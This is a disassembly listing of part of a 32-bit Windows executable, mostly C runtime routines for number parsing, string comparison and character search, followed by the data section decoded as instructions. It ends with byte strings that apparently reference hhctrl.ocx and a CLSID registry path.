  40a60e:	jmp    0x40a631
  40a610:	mov    DWORD PTR [ebp+0x14],0x10
  40a617:	jmp    0x40a623
  40a619:	cmp    eax,0x10
  40a61c:	jne    0x40a631
  40a61e:	cmp    bl,0x30
  40a621:	jne    0x40a631
  40a623:	mov    al,BYTE PTR [edi]
  40a625:	cmp    al,0x78
  40a627:	je     0x40a62d
  40a629:	cmp    al,0x58
  40a62b:	jne    0x40a631
  40a62d:	inc    edi
  40a62e:	mov    bl,BYTE PTR [edi]
  40a630:	inc    edi
  40a631:	mov    esi,DWORD PTR [ecx+0xc8]
  40a637:	mov    eax,0xffffffff
  40a63c:	xor    edx,edx
  40a63e:	div    DWORD PTR [ebp+0x14]
  40a641:	movzx  ecx,bl
  40a644:	movzx  ecx,WORD PTR [esi+ecx*2]
  40a648:	test   cl,0x4
  40a64b:	je     0x40a655
  40a64d:	movsx  ecx,bl
  40a650:	sub    ecx,0x30
  40a653:	jmp    0x40a670
  40a655:	test   ecx,0x103
  40a65b:	je     0x40a68e
  40a65d:	mov    cl,bl
  40a65f:	sub    cl,0x61
  40a662:	cmp    cl,0x19
  40a665:	movsx  ecx,bl
  40a668:	ja     0x40a66d
  40a66a:	sub    ecx,0x20
  40a66d:	add    ecx,0xffffffc9
  40a670:	cmp    ecx,DWORD PTR [ebp+0x14]
  40a673:	jae    0x40a68e
  40a675:	or     DWORD PTR [ebp+0x18],0x8
  40a679:	cmp    DWORD PTR [ebp-0x4],eax
  40a67c:	jb     0x40a6a5
  40a67e:	jne    0x40a684
  40a680:	cmp    ecx,edx
  40a682:	jbe    0x40a6a5
  40a684:	or     DWORD PTR [ebp+0x18],0x4
  40a688:	cmp    DWORD PTR [ebp+0x10],0x0
  40a68c:	jne    0x40a6b1
  40a68e:	mov    eax,DWORD PTR [ebp+0x18]
  40a691:	dec    edi
  40a692:	test   al,0x8
  40a694:	jne    0x40a6b6
  40a696:	cmp    DWORD PTR [ebp+0x10],0x0
  40a69a:	je     0x40a69f
  40a69c:	mov    edi,DWORD PTR [ebp+0xc]
  40a69f:	and    DWORD PTR [ebp-0x4],0x0
  40a6a3:	jmp    0x40a700
  40a6a5:	mov    ebx,DWORD PTR [ebp-0x4]
  40a6a8:	imul   ebx,DWORD PTR [ebp+0x14]
  40a6ac:	add    ebx,ecx
  40a6ae:	mov    DWORD PTR [ebp-0x4],ebx
  40a6b1:	mov    bl,BYTE PTR [edi]
  40a6b3:	inc    edi
  40a6b4:	jmp    0x40a641
  40a6b6:	mov    esi,0x7fffffff
  40a6bb:	test   al,0x4
  40a6bd:	jne    0x40a6da
  40a6bf:	test   al,0x1
  40a6c1:	jne    0x40a700
  40a6c3:	and    eax,0x2
  40a6c6:	je     0x40a6d1
  40a6c8:	cmp    DWORD PTR [ebp-0x4],0x80000000
  40a6cf:	ja     0x40a6da
  40a6d1:	test   eax,eax
  40a6d3:	jne    0x40a700
  40a6d5:	cmp    DWORD PTR [ebp-0x4],esi
  40a6d8:	jbe    0x40a700
  40a6da:	call   0x4024b6
  40a6df:	test   BYTE PTR [ebp+0x18],0x1
  40a6e3:	mov    DWORD PTR [eax],0x22
  40a6e9:	je     0x40a6f1
  40a6eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  40a6ef:	jmp    0x40a700
  40a6f1:	test   BYTE PTR [ebp+0x18],0x2
  40a6f5:	push   0x0
  40a6f7:	pop    eax
  40a6f8:	setne  al
  40a6fb:	add    eax,esi
  40a6fd:	mov    DWORD PTR [ebp-0x4],eax
  40a700:	mov    eax,DWORD PTR [ebp+0x10]
  40a703:	test   eax,eax
  40a705:	je     0x40a709
  40a707:	mov    DWORD PTR [eax],edi
  40a709:	test   BYTE PTR [ebp+0x18],0x2
  40a70d:	je     0x40a712
  40a70f:	neg    DWORD PTR [ebp-0x4]
  40a712:	cmp    BYTE PTR [ebp-0x8],0x0
  40a716:	je     0x40a71f
  40a718:	mov    eax,DWORD PTR [ebp-0xc]
  40a71b:	and    DWORD PTR [eax+0x70],0xfffffffd
  40a71f:	mov    eax,DWORD PTR [ebp-0x4]
  40a722:	jmp    0x40a73c
  40a724:	mov    eax,DWORD PTR [ebp+0x10]
  40a727:	test   eax,eax
  40a729:	je     0x40a72d
  40a72b:	mov    DWORD PTR [eax],esi
  40a72d:	cmp    BYTE PTR [ebp-0x8],0x0
  40a731:	je     0x40a73a
  40a733:	mov    eax,DWORD PTR [ebp-0xc]
  40a736:	and    DWORD PTR [eax+0x70],0xfffffffd
  40a73a:	xor    eax,eax
  40a73c:	pop    ebx
  40a73d:	pop    edi
  40a73e:	pop    esi
  40a73f:	leave  
  40a740:	ret    
  40a741:	mov    edi,edi
  40a743:	push   ebp
  40a744:	mov    ebp,esp
  40a746:	xor    eax,eax
  40a748:	push   eax
  40a749:	push   DWORD PTR [ebp+0x10]
  40a74c:	push   DWORD PTR [ebp+0xc]
  40a74f:	push   DWORD PTR [ebp+0x8]
  40a752:	cmp    DWORD PTR ds:0x40f7d8,eax
  40a758:	jne    0x40a761
  40a75a:	push   0x40eb30
  40a75f:	jmp    0x40a762
  40a761:	push   eax
  40a762:	call   0x40a512
  40a767:	add    esp,0x14
  40a76a:	pop    ebp
  40a76b:	ret    
  40a76c:	mov    edi,edi
  40a76e:	push   ebp
  40a76f:	mov    ebp,esp
  40a771:	sub    esp,0x18
  40a774:	push   ebx
  40a775:	push   DWORD PTR [ebp+0x10]
  40a778:	lea    ecx,[ebp-0x18]
  40a77b:	call   0x402290
  40a780:	mov    ebx,DWORD PTR [ebp+0x8]
  40a783:	lea    eax,[ebx+0x1]
  40a786:	cmp    eax,0x100
  40a78b:	ja     0x40a79c
  40a78d:	mov    eax,DWORD PTR [ebp-0x18]
  40a790:	mov    eax,DWORD PTR [eax+0xc8]
  40a796:	movzx  eax,WORD PTR [eax+ebx*2]
  40a79a:	jmp    0x40a811
  40a79c:	mov    DWORD PTR [ebp+0x8],ebx
  40a79f:	sar    DWORD PTR [ebp+0x8],0x8
  40a7a3:	lea    eax,[ebp-0x18]
  40a7a6:	push   eax
  40a7a7:	mov    eax,DWORD PTR [ebp+0x8]
  40a7aa:	and    eax,0xff
  40a7af:	push   eax
  40a7b0:	call   0x4057cc
  40a7b5:	pop    ecx
  40a7b6:	pop    ecx
  40a7b7:	test   eax,eax
  40a7b9:	je     0x40a7cd
  40a7bb:	mov    al,BYTE PTR [ebp+0x8]
  40a7be:	push   0x2
  40a7c0:	mov    BYTE PTR [ebp-0x8],al
  40a7c3:	mov    BYTE PTR [ebp-0x7],bl
  40a7c6:	mov    BYTE PTR [ebp-0x6],0x0
  40a7ca:	pop    ecx
  40a7cb:	jmp    0x40a7d7
  40a7cd:	xor    ecx,ecx
  40a7cf:	mov    BYTE PTR [ebp-0x8],bl
  40a7d2:	mov    BYTE PTR [ebp-0x7],0x0
  40a7d6:	inc    ecx
  40a7d7:	mov    eax,DWORD PTR [ebp-0x18]
  40a7da:	push   0x1
  40a7dc:	push   DWORD PTR [eax+0x14]
  40a7df:	push   DWORD PTR [eax+0x4]
  40a7e2:	lea    eax,[ebp-0x4]
  40a7e5:	push   eax
  40a7e6:	push   ecx
  40a7e7:	lea    eax,[ebp-0x8]
  40a7ea:	push   eax
  40a7eb:	lea    eax,[ebp-0x18]
  40a7ee:	push   0x1
  40a7f0:	push   eax
  40a7f1:	call   0x409031
  40a7f6:	add    esp,0x20
  40a7f9:	test   eax,eax
  40a7fb:	jne    0x40a80d
  40a7fd:	cmp    BYTE PTR [ebp-0xc],al
  40a800:	je     0x40a809
  40a802:	mov    eax,DWORD PTR [ebp-0x10]
  40a805:	and    DWORD PTR [eax+0x70],0xfffffffd
  40a809:	xor    eax,eax
  40a80b:	jmp    0x40a821
  40a80d:	movzx  eax,WORD PTR [ebp-0x4]
  40a811:	and    eax,DWORD PTR [ebp+0xc]
  40a814:	cmp    BYTE PTR [ebp-0xc],0x0
  40a818:	je     0x40a821
  40a81a:	mov    ecx,DWORD PTR [ebp-0x10]
  40a81d:	and    DWORD PTR [ecx+0x70],0xfffffffd
  40a821:	pop    ebx
  40a822:	leave  
  40a823:	ret    
  40a824:	mov    edi,edi
  40a826:	push   ebp
  40a827:	mov    ebp,esp
  40a829:	push   esi
  40a82a:	mov    esi,DWORD PTR [ebp+0x8]
  40a82d:	push   edi
  40a82e:	push   esi
  40a82f:	call   0x408601
  40a834:	pop    ecx
  40a835:	cmp    eax,0xffffffff
  40a838:	je     0x40a88a
  40a83a:	mov    eax,ds:0x412460
  40a83f:	cmp    esi,0x1
  40a842:	jne    0x40a84d
  40a844:	test   BYTE PTR [eax+0x84],0x1
  40a84b:	jne    0x40a858
  40a84d:	cmp    esi,0x2
  40a850:	jne    0x40a86e
  40a852:	test   BYTE PTR [eax+0x44],0x1
  40a856:	je     0x40a86e
  40a858:	push   0x2
  40a85a:	call   0x408601
  40a85f:	push   0x1
  40a861:	mov    edi,eax
  40a863:	call   0x408601
  40a868:	pop    ecx
  40a869:	pop    ecx
  40a86a:	cmp    eax,edi
  40a86c:	je     0x40a88a
  40a86e:	push   esi
  40a86f:	call   0x408601
  40a874:	pop    ecx
  40a875:	push   eax
  40a876:	call   DWORD PTR ds:0x40b030
  40a87c:	test   eax,eax
  40a87e:	jne    0x40a88a
  40a880:	call   DWORD PTR ds:0x40b08c
  40a886:	mov    edi,eax
  40a888:	jmp    0x40a88c
  40a88a:	xor    edi,edi
  40a88c:	push   esi
  40a88d:	call   0x40857b
  40a892:	mov    eax,esi
  40a894:	sar    eax,0x5
  40a897:	mov    eax,DWORD PTR [eax*4+0x412460]
  40a89e:	and    esi,0x1f
  40a8a1:	shl    esi,0x6
  40a8a4:	pop    ecx
  40a8a5:	mov    BYTE PTR [eax+esi*1+0x4],0x0
  40a8aa:	test   edi,edi
  40a8ac:	je     0x40a8ba
  40a8ae:	push   edi
  40a8af:	call   0x4024dc
  40a8b4:	pop    ecx
  40a8b5:	or     eax,0xffffffff
  40a8b8:	jmp    0x40a8bc
  40a8ba:	xor    eax,eax
  40a8bc:	pop    edi
  40a8bd:	pop    esi
  40a8be:	pop    ebp
  40a8bf:	ret    
  40a8c0:	push   0x10
  40a8c2:	push   0x40caa0
  40a8c7:	call   0x403b74
  40a8cc:	mov    eax,DWORD PTR [ebp+0x8]
  40a8cf:	cmp    eax,0xfffffffe
  40a8d2:	jne    0x40a8ef
  40a8d4:	call   0x4024c9
  40a8d9:	and    DWORD PTR [eax],0x0
  40a8dc:	call   0x4024b6
  40a8e1:	mov    DWORD PTR [eax],0x9
  40a8e7:	or     eax,0xffffffff
  40a8ea:	jmp    0x40a97d
  40a8ef:	xor    edi,edi
  40a8f1:	cmp    eax,edi
  40a8f3:	jl     0x40a8fd
  40a8f5:	cmp    eax,DWORD PTR ds:0x412450
  40a8fb:	jb     0x40a91e
  40a8fd:	call   0x4024c9
  40a902:	mov    DWORD PTR [eax],edi
  40a904:	call   0x4024b6
  40a909:	mov    DWORD PTR [eax],0x9
  40a90f:	push   edi
  40a910:	push   edi
  40a911:	push   edi
  40a912:	push   edi
  40a913:	push   edi
  40a914:	call   0x40244e
  40a919:	add    esp,0x14
  40a91c:	jmp    0x40a8e7
  40a91e:	mov    ecx,eax
  40a920:	sar    ecx,0x5
  40a923:	lea    ebx,[ecx*4+0x412460]
  40a92a:	mov    esi,eax
  40a92c:	and    esi,0x1f
  40a92f:	shl    esi,0x6
  40a932:	mov    ecx,DWORD PTR [ebx]
  40a934:	movsx  ecx,BYTE PTR [ecx+esi*1+0x4]
  40a939:	and    ecx,0x1
  40a93c:	je     0x40a8fd
  40a93e:	push   eax
  40a93f:	call   0x408678
  40a944:	pop    ecx
  40a945:	mov    DWORD PTR [ebp-0x4],edi
  40a948:	mov    eax,DWORD PTR [ebx]
  40a94a:	test   BYTE PTR [eax+esi*1+0x4],0x1
  40a94f:	je     0x40a95f
  40a951:	push   DWORD PTR [ebp+0x8]
  40a954:	call   0x40a824
  40a959:	pop    ecx
  40a95a:	mov    DWORD PTR [ebp-0x1c],eax
  40a95d:	jmp    0x40a96e
  40a95f:	call   0x4024b6
  40a964:	mov    DWORD PTR [eax],0x9
  40a96a:	or     DWORD PTR [ebp-0x1c],0xffffffff
  40a96e:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40a975:	call   0x40a983
  40a97a:	mov    eax,DWORD PTR [ebp-0x1c]
  40a97d:	call   0x403bb9
  40a982:	ret    
  40a983:	push   DWORD PTR [ebp+0x8]
  40a986:	call   0x408718
  40a98b:	pop    ecx
  40a98c:	ret    
  40a98d:	mov    edi,edi
  40a98f:	push   ebp
  40a990:	mov    ebp,esp
  40a992:	push   esi
  40a993:	mov    esi,DWORD PTR [ebp+0x8]
  40a996:	mov    eax,DWORD PTR [esi+0xc]
  40a999:	test   al,0x83
  40a99b:	je     0x40a9bb
  40a99d:	test   al,0x8
  40a99f:	je     0x40a9bb
  40a9a1:	push   DWORD PTR [esi+0x8]
  40a9a4:	call   0x402682
  40a9a9:	and    DWORD PTR [esi+0xc],0xfffffbf7
  40a9b0:	xor    eax,eax
  40a9b2:	pop    ecx
  40a9b3:	mov    DWORD PTR [esi],eax
  40a9b5:	mov    DWORD PTR [esi+0x8],eax
  40a9b8:	mov    DWORD PTR [esi+0x4],eax
  40a9bb:	pop    esi
  40a9bc:	pop    ebp
  40a9bd:	ret    
  40a9be:	int3   
  40a9bf:	int3   
  40a9c0:	push   ebp
  40a9c1:	mov    ebp,esp
  40a9c3:	push   edi
  40a9c4:	push   esi
  40a9c5:	push   ebx
  40a9c6:	mov    ecx,DWORD PTR [ebp+0x10]
  40a9c9:	or     ecx,ecx
  40a9cb:	je     0x40aa1a
  40a9cd:	mov    esi,DWORD PTR [ebp+0x8]
  40a9d0:	mov    edi,DWORD PTR [ebp+0xc]
  40a9d3:	mov    bh,0x41
  40a9d5:	mov    bl,0x5a
  40a9d7:	mov    dh,0x20
  40a9d9:	lea    ecx,[ecx+0x0]
  40a9dc:	mov    ah,BYTE PTR [esi]
  40a9de:	or     ah,ah
  40a9e0:	mov    al,BYTE PTR [edi]
  40a9e2:	je     0x40aa0b
  40a9e4:	or     al,al
  40a9e6:	je     0x40aa0b
  40a9e8:	add    esi,0x1
  40a9eb:	add    edi,0x1
  40a9ee:	cmp    ah,bh
  40a9f0:	jb     0x40a9f8
  40a9f2:	cmp    ah,bl
  40a9f4:	ja     0x40a9f8
  40a9f6:	add    ah,dh
  40a9f8:	cmp    al,bh
  40a9fa:	jb     0x40aa02
  40a9fc:	cmp    al,bl
  40a9fe:	ja     0x40aa02
  40aa00:	add    al,dh
  40aa02:	cmp    ah,al
  40aa04:	jne    0x40aa11
  40aa06:	sub    ecx,0x1
  40aa09:	jne    0x40a9dc
  40aa0b:	xor    ecx,ecx
  40aa0d:	cmp    ah,al
  40aa0f:	je     0x40aa1a
  40aa11:	mov    ecx,0xffffffff
  40aa16:	jb     0x40aa1a
  40aa18:	neg    ecx
  40aa1a:	mov    eax,ecx
  40aa1c:	pop    ebx
  40aa1d:	pop    esi
  40aa1e:	pop    edi
  40aa1f:	leave  
  40aa20:	ret    
  40aa21:	int3   
  40aa22:	int3   
  40aa23:	int3   
  40aa24:	int3   
  40aa25:	int3   
  40aa26:	int3   
  40aa27:	int3   
  40aa28:	int3   
  40aa29:	int3   
  40aa2a:	int3   
  40aa2b:	int3   
  40aa2c:	int3   
  40aa2d:	int3   
  40aa2e:	int3   
  40aa2f:	int3   
  40aa30:	mov    eax,DWORD PTR [esp+0x8]
  40aa34:	mov    ecx,DWORD PTR [esp+0x10]
  40aa38:	or     ecx,eax
  40aa3a:	mov    ecx,DWORD PTR [esp+0xc]
  40aa3e:	jne    0x40aa49
  40aa40:	mov    eax,DWORD PTR [esp+0x4]
  40aa44:	mul    ecx
  40aa46:	ret    0x10
  40aa49:	push   ebx
  40aa4a:	mul    ecx
  40aa4c:	mov    ebx,eax
  40aa4e:	mov    eax,DWORD PTR [esp+0x8]
  40aa52:	mul    DWORD PTR [esp+0x14]
  40aa56:	add    ebx,eax
  40aa58:	mov    eax,DWORD PTR [esp+0x8]
  40aa5c:	mul    ecx
  40aa5e:	add    edx,ebx
  40aa60:	pop    ebx
  40aa61:	ret    0x10
  40aa64:	int3   
  40aa65:	int3   
  40aa66:	int3   
  40aa67:	int3   
  40aa68:	int3   
  40aa69:	int3   
  40aa6a:	int3   
  40aa6b:	int3   
  40aa6c:	int3   
  40aa6d:	int3   
  40aa6e:	int3   
  40aa6f:	int3   
  40aa70:	lea    eax,[edx-0x1]
  40aa73:	pop    ebx
  40aa74:	ret    
  40aa75:	lea    esp,[esp+0x0]
  40aa7c:	lea    esp,[esp+0x0]
  40aa80:	xor    eax,eax
  40aa82:	mov    al,BYTE PTR [esp+0x8]
  40aa86:	push   ebx
  40aa87:	mov    ebx,eax
  40aa89:	shl    eax,0x8
  40aa8c:	mov    edx,DWORD PTR [esp+0x8]
  40aa90:	test   edx,0x3
  40aa96:	je     0x40aaad
  40aa98:	mov    cl,BYTE PTR [edx]
  40aa9a:	add    edx,0x1
  40aa9d:	cmp    cl,bl
  40aa9f:	je     0x40aa70
  40aaa1:	test   cl,cl
  40aaa3:	je     0x40aaf6
  40aaa5:	test   edx,0x3
  40aaab:	jne    0x40aa98
  40aaad:	or     ebx,eax
  40aaaf:	push   edi
  40aab0:	mov    eax,ebx
  40aab2:	shl    ebx,0x10
  40aab5:	push   esi
  40aab6:	or     ebx,eax
  40aab8:	mov    ecx,DWORD PTR [edx]
  40aaba:	mov    edi,0x7efefeff
  40aabf:	mov    eax,ecx
  40aac1:	mov    esi,edi
  40aac3:	xor    ecx,ebx
  40aac5:	add    esi,eax
  40aac7:	add    edi,ecx
  40aac9:	xor    ecx,0xffffffff
  40aacc:	xor    eax,0xffffffff
  40aacf:	xor    ecx,edi
  40aad1:	xor    eax,esi
  40aad3:	add    edx,0x4
  40aad6:	and    ecx,0x81010100
  40aadc:	jne    0x40aafa
  40aade:	and    eax,0x81010100
  40aae3:	je     0x40aab8
  40aae5:	and    eax,0x1010100
  40aaea:	jne    0x40aaf4
  40aaec:	and    esi,0x80000000
  40aaf2:	jne    0x40aab8
  40aaf4:	pop    esi
  40aaf5:	pop    edi
  40aaf6:	pop    ebx
  40aaf7:	xor    eax,eax
  40aaf9:	ret    
  40aafa:	mov    eax,DWORD PTR [edx-0x4]
  40aafd:	cmp    al,bl
  40aaff:	je     0x40ab37
  40ab01:	test   al,al
  40ab03:	je     0x40aaf4
  40ab05:	cmp    ah,bl
  40ab07:	je     0x40ab30
  40ab09:	test   ah,ah
  40ab0b:	je     0x40aaf4
  40ab0d:	shr    eax,0x10
  40ab10:	cmp    al,bl
  40ab12:	je     0x40ab29
  40ab14:	test   al,al
  40ab16:	je     0x40aaf4
  40ab18:	cmp    ah,bl
  40ab1a:	je     0x40ab22
  40ab1c:	test   ah,ah
  40ab1e:	je     0x40aaf4
  40ab20:	jmp    0x40aab8
  40ab22:	pop    esi
  40ab23:	pop    edi
  40ab24:	lea    eax,[edx-0x1]
  40ab27:	pop    ebx
  40ab28:	ret    
  40ab29:	lea    eax,[edx-0x2]
  40ab2c:	pop    esi
  40ab2d:	pop    edi
  40ab2e:	pop    ebx
  40ab2f:	ret    
  40ab30:	lea    eax,[edx-0x3]
  40ab33:	pop    esi
  40ab34:	pop    edi
  40ab35:	pop    ebx
  40ab36:	ret    
  40ab37:	lea    eax,[edx-0x4]
  40ab3a:	pop    esi
  40ab3b:	pop    edi
  40ab3c:	pop    ebx
  40ab3d:	ret    
  40ab3e:	jmp    DWORD PTR ds:0x40b060

Disassembly of section .rdata:

0040b000 <.rdata>:
  40b000:	dec    edx
  40b001:	aad    0x0
  40b003:	add    BYTE PTR [esi],dh
  40b005:	aad    0x0
  40b007:	add    BYTE PTR [eax],ch
  40b009:	aad    0x0
  40b00b:	add    BYTE PTR [eax],al
  40b00d:	add    BYTE PTR [eax],al
  40b00f:	add    dl,bh
  40b011:	iret   
  40b012:	add    BYTE PTR [eax],al
  40b014:	add    BYTE PTR [eax],al
  40b016:	add    BYTE PTR [eax],al
  40b018:	mov    bh,cl
  40b01a:	add    BYTE PTR [eax],al
  40b01c:	add    BYTE PTR [eax],al
  40b01e:	add    BYTE PTR [eax],al
  40b020:	xchg   esp,eax
  40b021:	int    0x0
  40b023:	add    BYTE PTR [edx+0x7a0000cd],al
  40b029:	int    0x0
  40b02b:	add    BYTE PTR [edx*8-0x2afa0000],dl
  40b032:	add    BYTE PTR [eax],al
  40b034:	clc    
  40b035:	aam    0x0
  40b037:	add    ah,ch
  40b039:	aam    0x0
  40b03b:	add    dl,bl
  40b03d:	aam    0x0
  40b03f:	add    BYTE PTR [esi-0x33],ch
  40b042:	add    BYTE PTR [eax],al
  40b044:	enter  0xd4,0x0
  40b048:	mov    dh,0xd4
  40b04a:	add    BYTE PTR [eax],al
  40b04c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b04d:	aam    0x0
  40b04f:	add    BYTE PTR [esi-0x7fffff2c],dl
  40b055:	aam    0x0
  40b057:	add    BYTE PTR [eax-0x2c],dh
  40b05a:	add    BYTE PTR [eax],al
  40b05c:	pusha  
  40b05d:	aam    0x0
  40b05f:	add    BYTE PTR [esp+edx*8+0x0],dl
  40b063:	add    BYTE PTR [esp+edx*8],ch
  40b066:	add    BYTE PTR [eax],al
  40b068:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b069:	int    0x0
  40b06b:	add    BYTE PTR [esp+edx*8],bl
  40b06e:	add    BYTE PTR [eax],al
  40b070:	push   cs
  40b071:	aam    0x0
  40b073:	add    dh,bh
  40b075:	rol    DWORD PTR [eax],cl
  40b077:	add    dl,dh
  40b079:	rol    DWORD PTR [eax],cl
  40b07b:	add    BYTE PTR [edx-0x33],dl
  40b07e:	add    BYTE PTR [eax],al
  40b080:	and    al,dl
  40b082:	add    BYTE PTR [eax],al
  40b084:	cmp    al,0xd0
  40b086:	add    BYTE PTR [eax],al
  40b088:	dec    esi
  40b089:	rol    BYTE PTR [eax],1
  40b08b:	add    BYTE PTR [esi-0x30],bl
  40b08e:	add    BYTE PTR [eax],al
  40b090:	outs   dx,BYTE PTR ds:[esi]
  40b091:	rol    BYTE PTR [eax],1
  40b093:	add    BYTE PTR [eax-0x5fffff30],cl
  40b099:	rol    BYTE PTR [eax],1
  40b09b:	add    BYTE PTR [eax-0x35ffff30],bh
  40b0a1:	rol    BYTE PTR [eax],1
  40b0a3:	add    dh,bl
  40b0a5:	rol    BYTE PTR [eax],1
  40b0a7:	add    dl,dh
  40b0a9:	rol    BYTE PTR [eax],1
  40b0ab:	add    BYTE PTR [esi],cl
  40b0ad:	rol    DWORD PTR [eax],1
  40b0af:	add    BYTE PTR [ecx+edx*8],ch
  40b0b2:	add    BYTE PTR [eax],al
  40b0b4:	inc    eax
  40b0b5:	rol    DWORD PTR [eax],1
  40b0b7:	add    BYTE PTR [ecx+edx*8+0x0],cl
  40b0bb:	add    BYTE PTR [eax-0x2f],ah
  40b0be:	add    BYTE PTR [eax],al
  40b0c0:	outs   dx,BYTE PTR ds:[esi]
  40b0c1:	rol    DWORD PTR [eax],1
  40b0c3:	add    BYTE PTR [edx-0x2f],bh
  40b0c6:	add    BYTE PTR [eax],al
  40b0c8:	mov    dl,cl
  40b0ca:	add    BYTE PTR [eax],al
  40b0cc:	mov    al,ds:0xba0000d1
  40b0d1:	rol    DWORD PTR [eax],1
  40b0d3:	add    ah,dl
  40b0d5:	rol    DWORD PTR [eax],1
  40b0d7:	add    dh,ah
  40b0d9:	rol    DWORD PTR [eax],1
  40b0db:	add    al,bh
  40b0dd:	rol    DWORD PTR [eax],1
  40b0df:	add    BYTE PTR [esi],al
  40b0e1:	rol    BYTE PTR [eax],cl
  40b0e3:	add    BYTE PTR [eax],bl
  40b0e5:	rol    BYTE PTR [eax],cl
  40b0e7:	add    BYTE PTR [eax],dh
  40b0e9:	rol    BYTE PTR [eax],cl
  40b0eb:	add    BYTE PTR [esi],bh
  40b0ed:	rol    BYTE PTR [eax],cl
  40b0ef:	add    BYTE PTR [edx-0x2e],cl
  40b0f2:	add    BYTE PTR [eax],al
  40b0f4:	pop    eax
  40b0f5:	rol    BYTE PTR [eax],cl
  40b0f7:	add    BYTE PTR [edx-0x2e],ah
  40b0fa:	add    BYTE PTR [eax],al
  40b0fc:	jp     0x40b0d0
  40b0fe:	add    BYTE PTR [eax],al
  40b100:	mov    dl,dl
  40b102:	add    BYTE PTR [eax],al
  40b104:	mov    al,ds:0xb80000d2
  40b109:	rol    BYTE PTR [eax],cl
  40b10b:	add    dh,al
  40b10d:	rol    BYTE PTR [eax],cl
  40b10f:	add    ah,dl
  40b111:	rol    BYTE PTR [eax],cl
  40b113:	add    dh,ch
  40b115:	rol    BYTE PTR [eax],cl
  40b117:	add    dh,bh
  40b119:	rol    BYTE PTR [eax],cl
  40b11b:	add    BYTE PTR [ebx+edx*8],dl
  40b11e:	add    BYTE PTR [eax],al
  40b120:	rol    DWORD PTR cs:[eax],cl
  40b123:	add    BYTE PTR [eax-0x2d],al
  40b126:	add    BYTE PTR [eax],al
  40b128:	push   esi
  40b129:	rol    DWORD PTR [eax],cl
  40b12b:	add    BYTE PTR [esi-0x2d],ah
  40b12e:	add    BYTE PTR [eax],al
  40b130:	js     0x40b105
  40b132:	add    BYTE PTR [eax],al
  40b134:	nop
  40b135:	rol    DWORD PTR [eax],cl
  40b137:	add    BYTE PTR [eax-0x4bffff2d],ch
  40b13d:	rol    DWORD PTR [eax],cl
  40b13f:	add    BYTE PTR [esi-0x35ffff2d],bh
  40b145:	rol    DWORD PTR [eax],cl
  40b147:	add    ah,bl
  40b149:	rol    DWORD PTR [eax],cl
  40b14b:	add    BYTE PTR [ecx*8+0x0],bh
  40b152:	add    BYTE PTR [eax],al
  40b154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b155:	iret   
  40b156:	add    BYTE PTR [eax],al
  40b158:	add    BYTE PTR [eax],al
  40b15a:	add    BYTE PTR [eax],al
  40b15c:	ret    0xcf
  40b15f:	add    dh,cl
  40b161:	iret   
  40b162:	add    BYTE PTR [eax],al
  40b164:	fmul   st,st(7)
  40b166:	add    BYTE PTR [eax],al
  40b168:	loop   0x40b139
  40b16a:	add    BYTE PTR [eax],al
  40b16c:	add    BYTE PTR [eax],al
  40b16e:	add    BYTE PTR [eax],al
  40b170:	push   0xffffffcf
  40b172:	add    BYTE PTR [eax],al
  40b174:	pop    esp
  40b175:	iret   
  40b176:	add    BYTE PTR [eax],al
  40b178:	dec    esp
  40b179:	iret   
  40b17a:	add    BYTE PTR [eax],al
  40b17c:	cmp    cl,bh
  40b17e:	add    BYTE PTR [eax],al
  40b180:	cs iret 
  40b182:	add    BYTE PTR [eax],al
  40b184:	and    bh,cl
  40b186:	add    BYTE PTR [eax],al
  40b188:	push   cs
  40b189:	iret   
  40b18a:	add    BYTE PTR [eax],al
  40b18c:	dec    dh
  40b18e:	add    BYTE PTR [eax],al
  40b190:	out    dx,al
  40b191:	into   
  40b192:	add    BYTE PTR [eax],al
  40b194:	loopne 0x40b164
  40b196:	add    BYTE PTR [eax],al
  40b198:	ret    0xce
  40b19b:	add    BYTE PTR [eax-0x5fffff32],dh
  40b1a1:	into   
  40b1a2:	add    BYTE PTR [eax],al
  40b1a4:	xchg   edx,eax
  40b1a5:	into   
  40b1a6:	add    BYTE PTR [eax],al
  40b1a8:	or     dh,0x0
  40b1ab:	add    BYTE PTR [esi-0x32],ch
  40b1ae:	add    BYTE PTR [eax],al
  40b1b0:	pop    esp
  40b1b1:	into   
  40b1b2:	add    BYTE PTR [eax],al
  40b1b4:	dec    eax
  40b1b5:	into   
  40b1b6:	add    BYTE PTR [eax],al
  40b1b8:	cmp    cl,dh
  40b1ba:	add    BYTE PTR [eax],al
  40b1bc:	cs into 
  40b1be:	add    BYTE PTR [eax],al
  40b1c0:	sbb    cl,dh
  40b1c2:	add    BYTE PTR [eax],al
  40b1c4:	push   es
  40b1c5:	into   
  40b1c6:	add    BYTE PTR [eax],al
  40b1c8:	out    dx,al
  40b1c9:	int    0x0
  40b1cb:	add    al,ah
  40b1cd:	int    0x0
  40b1cf:	add    ah,cl
  40b1d1:	int    0x0
  40b1d3:	add    BYTE PTR [esi-0x2dffff33],bh
  40b1d9:	into   
	...
  40b1ea:	add    BYTE PTR [eax],al
  40b1ec:	pop    edx
  40b1ed:	dec    eax
  40b1ee:	inc    eax
  40b1ef:	add    BYTE PTR [ebx],al
  40b1f1:	push   ecx
  40b1f2:	inc    eax
  40b1f3:	add    BYTE PTR [edi],ch
  40b1f5:	js     0x40b237
  40b1f7:	add    BYTE PTR [esi-0x6ffbf68],bl
  40b1fd:	sub    BYTE PTR [eax+0x0],al
	...
  40b208:	into   
  40b209:	mov    al,ds:0x490b0040
  40b20e:	inc    eax
	...
  40b223:	add    BYTE PTR [ebp+0x50bcdf],dh
  40b229:	add    BYTE PTR [eax],al
  40b22b:	add    BYTE PTR [edx],al
  40b22d:	add    BYTE PTR [eax],al
  40b22f:	add    BYTE PTR [ebp+0x0],al
  40b232:	add    BYTE PTR [eax],al
  40b234:	mov    al,0xc6
  40b236:	add    BYTE PTR [eax],al
  40b238:	mov    al,0xb6
  40b23a:	add    BYTE PTR [eax],al
  40b23c:	push   0x72746368
  40b241:	ins    BYTE PTR es:[edi],dx
  40b242:	outs   dx,DWORD PTR cs:[esi]
  40b244:	arpl   WORD PTR [eax+0x0],di
  40b247:	add    BYTE PTR [ebx+0x4c],al
  40b24a:	push   ebx
  40b24b:	dec    ecx
  40b24c:	inc    esp
  40b24d:	pop    esp
  40b24e:	jnp    0x40b291
  40b250:	inc    esp
  40b251:	inc    edx
